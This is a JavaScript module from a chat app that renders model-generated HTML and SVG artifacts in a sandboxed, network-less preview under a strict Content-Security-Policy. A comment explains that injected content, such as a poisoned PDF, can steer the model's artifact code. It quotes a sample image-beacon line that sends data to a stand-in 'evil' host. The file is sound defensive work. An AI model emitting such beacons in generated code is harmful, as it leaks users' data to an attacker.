import { annotateHtml } from './htmlNodes.js';
import { PICKER_SCRIPT } from './pickerScript.js';

/**
 * Artifact helpers. An "artifact" is a fenced ```html or ```svg block in an
 * assistant message; the UI renders it live in a sandboxed preview panel
 * (Claude-Artifacts style).
 *
 * `messageId` + `index` identify where the code lives in the database, which is
 * what point-and-edit needs to splice a targeted change back into it. Keep the
 * fence regex in sync with server/src/lib/artifacts.js.
 */
export function extractArtifacts(content, messageId = null) {
  const artifacts = [];
  if (!content) return artifacts;
  const re = /```(html|svg)\s*\n([\s\S]*?)(?:```|$)/g;
  let match;
  while ((match = re.exec(content)) !== null) {
    const code = match[2].trim();
    if (code.length < 30) continue; // ignore trivial snippets
    artifacts.push({
      language: match[1],
      code,
      title: deriveTitle(match[1], code),
      messageId,
      index: artifacts.length,
    });
  }
  return artifacts;
}

function deriveTitle(language, code) {
  const comment = code.match(/<!--\s*title:\s*(.+?)\s*-->/);
  if (comment) return comment[1];
  const titleTag = code.match(/<title>([^<]*)<\/title>/i);
  if (titleTag && titleTag[1].trim()) return titleTag[1].trim();
  return language === 'svg' ? 'vector.svg' : 'index.html';
}

/**
 * Content-Security-Policy for every artifact preview.
 *
 * Artifact HTML/JS is model-generated and can be steered by anything in the
 * conversation (a poisoned PDF, a pasted page), so the preview gets NO network
 * at all: `default-src 'none'` kills fetch/XHR/WebSocket/beacon/workers and
 * nested frames, `form-action 'none'` kills form posts, and images/media/fonts
 * are limited to data:/blob: so an `<img src="https://evil/?data=…">` beacon
 * cannot leave either. Inline script and style stay allowed — that IS the
 * artifact (and the injected picker runtime); 'unsafe-eval' is allowed because
 * it adds no way to reach the network, and artifacts legitimately use eval.
 *
 * Consequence to know about: artifacts cannot load remote images, fonts or
 * scripts. The system prompt already forbids external assets, so this enforces
 * a documented rule rather than changing what models are asked for.
 */
const PREVIEW_CSP = [
  "default-src 'none'",
  'img-src data: blob:',
  'media-src data: blob:',
  'font-src data:',
  "style-src 'unsafe-inline'",
  "script-src 'unsafe-inline' 'unsafe-eval'",
  "form-action 'none'",
  "base-uri 'none'",
].join('; ');

const CSP_META = `<meta http-equiv="Content-Security-Policy" content="${PREVIEW_CSP}">`;

const escapeHtml = (text) =>
  String(text).replace(/&/g, '&amp;').replace(/</g, '&lt;').replace(/>/g, '&gt;').replace(/"/g, '&quot;');

/**
 * Puts the CSP meta first inside the document's (possibly implied) head — a
 * meta CSP is only honoured there, and only applies to what follows it.
 */
function withCsp(doc) {
  const bodyAt = doc.search(/<body[\s>]/i);
  const beforeBody = (m) => m && (bodyAt === -1 || m.index < bodyAt);

  const head = doc.match(/<head\b[^>]*>/i);
  if (beforeBody(head)) {
    const at = head.index + head[0].length;
    return doc.slice(0, at) + CSP_META + doc.slice(at);
  }
  const html = doc.match(/<html\b[^>]*>/i);
  if (beforeBody(html)) {
    const at = html.index + html[0].length;
    return `${doc.slice(0, at)}<head>${CSP_META}</head>${doc.slice(at)}`;
  }
  const doctype = doc.match(/<!DOCTYPE[^>]*>/i);
  if (doctype && doctype.index === 0) {
    const at = doctype[0].length;
    return doc.slice(0, at) + CSP_META + doc.slice(at);
  }
  return CSP_META + doc;
}

/**
 * Builds the full document loaded into the sandboxed preview iframe.
 *
 * With `{ picker: true }` the artifact code is stamped with data-pm-node
 * attributes and the point-and-edit runtime is injected, so clicks in the
 * preview can be mapped back to exact source ranges. The stamping happens on
 * `artifact.code` only (never on the wrapper below), so the ids line up with
 * the code the server has stored — that's what makes the splice safe.
 */
export function buildPreviewDoc(artifact, { picker = false } = {}) {
  if (!artifact) return '';
  const code = picker ? annotateHtml(artifact.code) : artifact.code;
  const runtime = picker ? `<script>${PICKER_SCRIPT}</script>` : '';

  if (artifact.language === 'svg') {
    return `<!DOCTYPE html>
<html><head>${CSP_META}<meta charset="utf-8"><style>
  body { margin: 0; min-height: 100vh; display: grid; place-items: center; background: #fff; }
  svg { max-width: 96vw; max-height: 96vh; }
</style></head><body>${code}${runtime}</body></html>`;
  }
  if (/^\s*(<!DOCTYPE|<html)/i.test(artifact.code)) {
    if (!runtime) return withCsp(code);
    // Inject at the very end of the body so the runtime sees the full DOM.
    const closeBody = code.toLowerCase().lastIndexOf('</body>');
    return withCsp(
      closeBody === -1
        ? `${code}${runtime}`
        : `${code.slice(0, closeBody)}${runtime}${code.slice(closeBody)}`
    );
  }
  return `<!DOCTYPE html>
<html><head>${CSP_META}<meta charset="utf-8"><meta name="viewport" content="width=device-width, initial-scale=1">
<style>body { font-family: ui-sans-serif, system-ui, sans-serif; margin: 0; padding: 16px; }</style>
</head><body>${code}${runtime}</body></html>`;
}

/**
 * Opens the artifact in a new tab, inside a sandboxed iframe on a blank wrapper
 * page. It must NOT be a blob: URL: those inherit this app's origin, so the
 * model's JS would run same-origin with the user's chats and API. The artifact
 * only ever reaches an opaque origin, and only through a quoted srcdoc
 * attribute (escaping " and & is what makes breaking out of it impossible).
 * Returns false if the browser blocked the popup.
 */
export function openArtifactInNewTab(artifact) {
  const doc = buildPreviewDoc(artifact);
  const tab = window.open('about:blank', '_blank');
  if (!tab) return false;
  tab.document.write(
    [
      '<!DOCTYPE html><html><head><meta charset="utf-8">',
      `<title>${escapeHtml(artifact?.title || 'artifact')}</title>`,
      '<style>html,body{margin:0;height:100%;background:#fff}',
      'iframe{display:block;border:0;width:100%;height:100%}</style></head>',
      `<body><iframe sandbox="allow-scripts" srcdoc="${escapeHtml(doc)}"></iframe></body></html>`,
    ].join('')
  );
  tab.document.close();
  return true;
}

/** Compact relative time, e.g. "just now", "5m", "2h", "3d". */
export function timeAgo(iso) {
  if (!iso) return '';
  const seconds = Math.max(0, (Date.now() - new Date(iso).getTime()) / 1000);
  if (seconds < 45) return 'now';
  const minutes = seconds / 60;
  if (minutes < 60) return `${Math.round(minutes)}m`;
  const hours = minutes / 60;
  if (hours < 24) return `${Math.round(hours)}h`;
  const days = hours / 24;
  if (days < 7) return `${Math.round(days)}d`;
  return new Date(iso).toLocaleDateString(undefined, { month: 'short', day: 'numeric' });
}
